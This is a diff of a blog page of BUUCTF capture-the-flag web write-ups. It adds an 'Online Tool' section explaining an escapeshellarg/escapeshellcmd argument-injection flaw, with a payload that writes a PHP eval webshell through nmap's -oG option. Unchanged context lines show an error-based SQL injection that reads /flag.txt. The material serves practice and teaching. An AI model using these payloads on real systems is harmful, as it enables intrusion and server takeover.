@@ -83,11 +83,11 @@
 <meta name="keywords" content="web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buuctf刷题之旅">
-<meta property="og:url" content="https://Horizoncy.github.io/2020/02/04/buuctf刷题之旅(2020寒假篇)/index.html">
+<meta property="og:url" content="https://Horizoncy.github.io/2020/02/04/buuctf web 刷题之旅(2020寒假篇)/index.html">
 <meta property="og:site_name" content="Horizon&#39;s Security Notes">
 <meta property="og:description" content="buuctf刷题之旅">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-02-11T07:29:49.429Z">
+<meta property="og:updated_time" content="2020-02-14T05:34:28.388Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="buuctf刷题之旅">
 <meta name="twitter:description" content="buuctf刷题之旅">
@@ -120,7 +120,7 @@
 
 
 
-  <link rel="canonical" href="https://Horizoncy.github.io/2020/02/04/buuctf刷题之旅(2020寒假篇)/">
+  <link rel="canonical" href="https://Horizoncy.github.io/2020/02/04/buuctf web 刷题之旅(2020寒假篇)/">
 
 
 
@@ -285,7 +285,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://Horizoncy.github.io/2020/02/04/buuctf刷题之旅(2020寒假篇)/">
+    <link itemprop="mainEntityOfPage" href="https://Horizoncy.github.io/2020/02/04/buuctf web 刷题之旅(2020寒假篇)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Horizon">
@@ -526,6 +526,24 @@
 <p>可以看出，address会被转义，然后进行更新，也就是说单引号之类的无效了。但是，在地址被更新的同时，旧地址被存了下来。如果第一次修改地址的时候，构造一个含SQL语句特殊的payload，然后在第二次修改的时候随便更新一个正常的地址，那个之前没有触发SQL注入的payload就会被触发。<br>思路有了以后，接下来就是构造payload，下面将借助报错注入来构造payload。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&apos;/flag.txt&apos;),1,20)),0x7e),1)#</span><br><span class="line">直接load_file不能显示全，这里分两次构造payload。</span><br><span class="line">1&apos; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&apos;/flag.txt&apos;),20,50)),0x7e),1)#</span><br></pre></td></tr></table></figure>
 
+<h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018] Online Tool"></a>[BUUCTF 2018] Online Tool</h2><p>进去直接有源码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) &#123;</span><br><span class="line">    $_SERVER[&apos;REMOTE_ADDR&apos;] = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">if(!isset($_GET[&apos;host&apos;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&apos;host&apos;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    echo &apos;you are in sandbox &apos;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>escapeshellarg()和escapeshellcmd() 没见过，百度<br>PHP escapeshellarg()+escapeshellcmd() 之殇</p>
+<p>直接找到了上面这篇文章，这两个函数在一起用会有些问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">传入的参数是：172.17.0.2&apos; -v -d a=1</span><br><span class="line">经过escapeshellarg处理后变成了&apos;172.17.0.2&apos;\&apos;&apos; -v -d a=1&apos;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">经过escapeshellcmd处理后变成&apos;172.17.0.2&apos;\\&apos;&apos; -v -d a=1\&apos;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span><br><span class="line">最后执行的命令是curl &apos;172.17.0.2&apos;\\&apos;&apos; -v -d a=1\&apos;，由于中间的\\被解释为\而不再是转义字符，所以后面的&apos;没有被转义，与再后面的&apos;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&apos;，即向172.17.0.2\发起请求，POST 数据为a=1&apos;。</span><br></pre></td></tr></table></figure>
+
+<p>简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题</p>
+<p>然后往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);</p>
+<p>这有个system来执行命令，而且有传参，肯定是利用这里了</p>
+<p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p>
+<p>这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</p>
+<p>这时候就只有想想能不能利用nmap来做些什么了。</p>
+<p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
+<p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&apos; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &apos;</span><br></pre></td></tr></table></figure>
+
+<p>执行后会返回文件夹名,连一下找到flag.</p>
 
       
     </div>
@@ -649,7 +667,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -711,7 +729,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf刷题之旅"><span class="nav-number">1.</span> <span class="nav-text">buuctf刷题之旅</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-安洵杯-easy-web"><span class="nav-number">1.1.</span> <span class="nav-text">2019 安洵杯 easy_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF–PingPingPing"><span class="nav-number">1.2.</span> <span class="nav-text">GXYCTF–PingPingPing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019–BabySqli"><span class="nav-number">1.3.</span> <span class="nav-text">GXYCTF2019–BabySqli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BabySQL"><span class="nav-number">1.4.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-number">1.5.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-number">1.6.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-初赛-Love-Math"><span class="nav-number">1.7.</span> <span class="nav-text">[CISCN 2019 初赛]Love Math</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路一"><span class="nav-number">1.7.1.</span> <span class="nav-text">思路一:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路二"><span class="nav-number">1.7.2.</span> <span class="nav-text">思路二:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Upload"><span class="nav-number">1.8.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-Easy-MD5"><span class="nav-number">1.9.</span> <span class="nav-text">[BJDCTF2020]Easy MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-我有一个数据库"><span class="nav-number">1.10.</span> <span class="nav-text">[GWCTF 2019]我有一个数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">1.11.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-PHP"><span class="nav-number">1.12.</span> <span class="nav-text">[极客大挑战 2019] PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#virink-2019-files-share"><span class="nav-number">1.13.</span> <span class="nav-text">virink_2019_files_share</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-LoveSQL"><span class="nav-number">1.14.</span> <span class="nav-text">[极客大挑战 2019] LoveSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BuyFlag"><span class="nav-number">1.15.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn2019华北赛区半决赛day1web5CyberPunk"><span class="nav-number">1.16.</span> <span class="nav-text">ciscn2019华北赛区半决赛day1web5CyberPunk</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buuctf刷题之旅"><span class="nav-number">1.</span> <span class="nav-text">buuctf刷题之旅</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-安洵杯-easy-web"><span class="nav-number">1.1.</span> <span class="nav-text">2019 安洵杯 easy_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF–PingPingPing"><span class="nav-number">1.2.</span> <span class="nav-text">GXYCTF–PingPingPing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019–BabySqli"><span class="nav-number">1.3.</span> <span class="nav-text">GXYCTF2019–BabySqli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BabySQL"><span class="nav-number">1.4.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-禁止套娃"><span class="nav-number">1.5.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Secret-File"><span class="nav-number">1.6.</span> <span class="nav-text">[极客大挑战 2019]Secret File</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-初赛-Love-Math"><span class="nav-number">1.7.</span> <span class="nav-text">[CISCN 2019 初赛]Love Math</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路一"><span class="nav-number">1.7.1.</span> <span class="nav-text">思路一:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路二"><span class="nav-number">1.7.2.</span> <span class="nav-text">思路二:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-Upload"><span class="nav-number">1.8.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF2020-Easy-MD5"><span class="nav-number">1.9.</span> <span class="nav-text">[BJDCTF2020]Easy MD5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-我有一个数据库"><span class="nav-number">1.10.</span> <span class="nav-text">[GWCTF 2019]我有一个数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-枯燥的抽奖"><span class="nav-number">1.11.</span> <span class="nav-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-PHP"><span class="nav-number">1.12.</span> <span class="nav-text">[极客大挑战 2019] PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#virink-2019-files-share"><span class="nav-number">1.13.</span> <span class="nav-text">virink_2019_files_share</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-LoveSQL"><span class="nav-number">1.14.</span> <span class="nav-text">[极客大挑战 2019] LoveSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-2019-BuyFlag"><span class="nav-number">1.15.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn2019华北赛区半决赛day1web5CyberPunk"><span class="nav-number">1.16.</span> <span class="nav-text">ciscn2019华北赛区半决赛day1web5CyberPunk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">1.17.</span> <span class="nav-text">[BUUCTF 2018] Online Tool</span></a></li></ol></li></ol></div>
             
 
           </div>
